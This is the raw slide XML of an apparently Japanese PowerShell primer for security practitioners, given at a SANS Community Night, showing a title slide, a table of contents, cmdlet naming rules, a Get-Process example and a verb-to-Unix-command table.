                <a:gd name="T27" fmla="*/ 43 h 153"/>
                <a:gd name="T28" fmla="*/ 0 w 103"/>
                <a:gd name="T29" fmla="*/ 33 h 153"/>
                <a:gd name="T30" fmla="*/ 8 w 103"/>
                <a:gd name="T31" fmla="*/ 18 h 153"/>
                <a:gd name="T32" fmla="*/ 21 w 103"/>
                <a:gd name="T33" fmla="*/ 6 h 153"/>
                <a:gd name="T34" fmla="*/ 41 w 103"/>
                <a:gd name="T35" fmla="*/ 0 h 153"/>
                <a:gd name="T36" fmla="*/ 52 w 103"/>
                <a:gd name="T37" fmla="*/ 0 h 153"/>
                <a:gd name="T38" fmla="*/ 72 w 103"/>
                <a:gd name="T39" fmla="*/ 2 h 153"/>
                <a:gd name="T40" fmla="*/ 83 w 103"/>
                <a:gd name="T41" fmla="*/ 4 h 153"/>
                <a:gd name="T42" fmla="*/ 97 w 103"/>
                <a:gd name="T43" fmla="*/ 0 h 153"/>
                <a:gd name="T44" fmla="*/ 83 w 103"/>
                <a:gd name="T45" fmla="*/ 49 h 153"/>
                <a:gd name="T46" fmla="*/ 81 w 103"/>
                <a:gd name="T47" fmla="*/ 31 h 153"/>
                <a:gd name="T48" fmla="*/ 74 w 103"/>
                <a:gd name="T49" fmla="*/ 18 h 153"/>
                <a:gd name="T50" fmla="*/ 64 w 103"/>
                <a:gd name="T51" fmla="*/ 8 h 153"/>
                <a:gd name="T52" fmla="*/ 50 w 103"/>
                <a:gd name="T53" fmla="*/ 6 h 153"/>
                <a:gd name="T54" fmla="*/ 41 w 103"/>
                <a:gd name="T55" fmla="*/ 8 h 153"/>
                <a:gd name="T56" fmla="*/ 27 w 103"/>
                <a:gd name="T57" fmla="*/ 20 h 153"/>
                <a:gd name="T58" fmla="*/ 25 w 103"/>
                <a:gd name="T59" fmla="*/ 29 h 153"/>
                <a:gd name="T60" fmla="*/ 27 w 103"/>
                <a:gd name="T61" fmla="*/ 39 h 153"/>
                <a:gd name="T62" fmla="*/ 35 w 103"/>
                <a:gd name="T63" fmla="*/ 47 h 153"/>
                <a:gd name="T64" fmla="*/ 66 w 103"/>
                <a:gd name="T65" fmla="*/ 62 h 153"/>
                <a:gd name="T66" fmla="*/ 83 w 103"/>
                <a:gd name="T67" fmla="*/ 72 h 153"/>
                <a:gd name="T68" fmla="*/ 99 w 103"/>
                <a:gd name="T69" fmla="*/ 88 h 153"/>
                <a:gd name="T70" fmla="*/ 103 w 103"/>
                <a:gd name="T71" fmla="*/ 107 h 153"/>
                <a:gd name="T72" fmla="*/ 103 w 103"/>
                <a:gd name="T73" fmla="*/ 117 h 153"/>
                <a:gd name="T74" fmla="*/ 95 w 103"/>
                <a:gd name="T75" fmla="*/ 134 h 153"/>
                <a:gd name="T76" fmla="*/ 83 w 103"/>
                <a:gd name="T77" fmla="*/ 146 h 153"/>
                <a:gd name="T78" fmla="*/ 64 w 103"/>
                <a:gd name="T79" fmla="*/ 153 h 153"/>
                <a:gd name="T80" fmla="*/ 52 w 103"/>
                <a:gd name="T81" fmla="*/ 153 h 153"/>
                <a:gd name="T82" fmla="*/ 25 w 103"/>
                <a:gd name="T83" fmla="*/ 150 h 153"/>
                <a:gd name="T84" fmla="*/ 13 w 103"/>
                <a:gd name="T85" fmla="*/ 150 h 153"/>
                <a:gd name="T86" fmla="*/ 0 w 103"/>
                <a:gd name="T87" fmla="*/ 152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153">
                  <a:moveTo>
                    <a:pt x="2" y="101"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="11" y="101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11" y="101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="130"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="130"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="27" y="138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="35" y="142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="42" y="146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52" y="148"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52" y="148"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="72" y="140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="77" y="132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="79" y="122"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="79" y="122"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="77" y="113"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="72" y="105"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="60" y="97"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="41" y="88"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="41" y="88"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="78"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9" y="68"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9" y="68"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6" y="64"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2" y="56"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="51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0" y="33"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4" y="25"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8" y="18"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="6"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="31" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="41" y="0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72" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="72" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="83" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="83" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="89" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="97" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="95" y="49"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="83" y="49"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="83" y="49"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="81" y="31"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="77" y="23"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="18"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="70" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="8"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58" y="6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41" y="8"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="33" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="27" y="20"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="29"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="29"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="33"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="27" y="39"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="35" y="47"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="35" y="47"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="42" y="51"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="66" y="62"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="66" y="62"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="83" y="72"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="95" y="82"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="99" y="88"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="101" y="93"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="103" y="107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="103" y="107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="103" y="117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="99" y="126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="95" y="134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="89" y="142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="83" y="146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52" y="153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52" y="153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="42" y="153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13" y="150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13" y="150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2" y="1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  <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DB64050B-D080-408B-95C0-7E82AEEDD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591" y="3624640"/>
            <a:ext cx="10442575" cy="932563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30000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2400" b="1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SANS Community Night</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2400" b="1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</a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2400" b="1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2023-12-06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80A0765E-8914-4A93-C95C-A54CEECF1A56}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9300356" y="5532046"/>
            <a:ext cx="25322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dirty="0"/>
              <a:t>渡辺 慎太郎</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0"/>
              <a:t>swat@dfirr.com</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="52" name="グラフィックス 51">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4036B280-B9D2-2A80-791E-225301BAD7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4452" y="6305314"/>
            <a:ext cx="1143000" cy="400050"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic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F72A924A-6D05-F364-46BB-4A86FEC65676}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875591" y="695021"/>
            <a:ext cx="77939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tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ダウンロード先  https://dfirr.hatenablog.com/entry/sans202</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>120</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP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3359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E7D28D98-814A-DE71-CF7C-3B52D790D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000" dirty="0">
                <a:latin typeface="メイリオ"/>
                <a:ea typeface="メイリオ"/>
              </a:rPr>
              <a:t>情報セキュリティ実務家のための</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="ja-JP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メイリオ"/>
                <a:ea typeface="メイリオ"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2800" b="1" dirty="0">
                <a:latin typeface="メイリオ"/>
                <a:ea typeface="メイリオ"/>
              </a:rPr>
              <a:t>PowerShell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:latin typeface="メイリオ"/>
                <a:ea typeface="メイリオ"/>
              </a:rPr>
              <a:t>超特急</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="メイリオ"/>
                <a:ea typeface="メイリオ"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" b="1" dirty="0">
                <a:latin typeface="メイリオ"/>
                <a:ea typeface="メイリオ"/>
              </a:rPr>
              <a:t>《</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="メイリオ"/>
                <a:ea typeface="メイリオ"/>
              </a:rPr>
              <a:t>増補版</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" b="1" dirty="0">
                <a:latin typeface="メイリオ"/>
                <a:ea typeface="メイリオ"/>
              </a:rPr>
              <a:t>》</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="2000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DACE134-DA18-AE72-E0F0-319F89FED3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6237DE0-2201-247E-8851-5B5E20DBAA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1</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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6DB563E8-2490-C668-A329-F9D20AAFA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1683" y="2852936"/>
            <a:ext cx="8064016" cy="147616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numCol="3" spcCol="288000">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/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sz="2000" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>基本事項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sz="2000" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>プロセス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sz="2000" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>ネットワーク</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000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sz="2000" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>ファイル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sz="2000" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>永続化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sz="2000" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>イベントログ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000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sz="2000" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>環境整備</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000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sz="2000" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>学習案内</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000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sz="2000" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>まとめ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
            </a:endParaRPr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4068AC82-4705-11AA-8575-B75319374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1683" y="2360959"/>
            <a:ext cx="8065604" cy="30777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900"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0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目次</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="20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3" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DFA5A854-DDE6-EB5B-7AAD-248A81B5E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7728" y="5077398"/>
            <a:ext cx="7667971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spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="17" name="グラフィックス 16">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4B829E56-02F7-3457-5672-3B53A8979F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76358" y="4869160"/>
            <a:ext cx="1722573" cy="1302433"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{50339FCF-CA3B-EC96-234E-4E1F4C76C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5660" y="5841268"/>
            <a:ext cx="6444716" cy="30777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spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>※</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>この文書は、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>PowerShell 5.1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>を前提としています。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53A947C-88B4-5103-81A8-D7B8386CC521}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2819636" y="1659053"/>
            <a:ext cx="77939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tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ダウンロード先  https://dfirr.hatenablog.com/entry/sans202</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>120</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP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8451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B8A97095-D74F-1523-4BDF-C33175567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基本事項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B1A3634-9A80-ED54-4F9C-0424A2E81B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EC69347-8763-DBF7-CA76-00756F5B9F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2</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{85B9A500-70A4-FFE3-5D14-37EED0D0B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7868" y="4941168"/>
            <a:ext cx="6407830" cy="126014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numCol="3" spcCol="288000">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/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b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>基本事項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プロセス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ネットワーク</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP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ファイル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永続化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イベントログ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP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環境整備</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP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学習案内</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP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まとめ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" dirty="0">
              <a:latin typeface="+mn-ea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87223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F8EA2E56-B37D-78C8-F10B-4CEBD0A2A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基本事項 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>コマンドレット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79B5F6F-91A7-8655-3348-3EE4F79C56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5B2B98-D3CE-7987-3F5A-6D555C96DE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3</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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40FDA9BE-6AFF-D6D4-6343-B2860ABCE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903347"/>
            <a:ext cx="10440989" cy="7925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PowerShell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の内部コマンドは</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>コマンドレット（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>Cmdlet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>）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と呼ばれる。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0" indent="-342900" algn="just">
              <a:spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft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コマンドレットは、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>動詞</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>名詞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の命名規則をもっている。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ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104A012-322C-2D75-CB1E-104B893DC4ED}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1883532" y="1808820"/>
            <a:ext cx="8280920" cy="13234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ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt; Get-Process -Id $PID -IncludeUserName</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="1000" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>     WS(M)   CPU(s)      Id UserName         ProcessName</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>     -----   ------      -- --------         -----------</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>     92.39     1.09   16096 lnv2202\swat     p</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>owershell</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="8" name="表 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2A2E977A-1EFE-7337-6892-37B34AB6DD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9803934"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="6463122" y="3429000"/>
          <a:ext cx="4493417" cy="30784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6432">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2810130588"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1823701">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4290245929"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1513284">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="16342639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Verb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Example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Is like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14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Get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Get-</a:t>
                      </a:r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ChildItem</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP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Get-Location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ls</a:t>
                      </a:r>
                    </a:p>
                    <a:p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pwd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370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Set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Set-Location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cd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033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New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New-Item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touch, </a:t>
                      </a:r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mkdir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367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i="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Copy</a:t>
                      </a:r>
